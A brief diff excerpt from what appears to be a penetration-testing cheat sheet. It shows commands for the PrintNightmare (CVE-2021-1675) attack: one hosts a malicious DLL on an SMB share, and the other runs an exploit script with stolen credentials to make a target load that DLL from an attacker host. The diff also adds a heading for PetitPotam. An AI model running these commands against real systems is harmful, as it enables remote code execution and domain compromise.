@@ -58,3 +58,5 @@ sudo smbserver.py -smb2support [share_name] [path_to_dll]
 ```bash
 sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\[filename].dll'
 ```
+
+## PetitPotam (MS-EFSRPC)
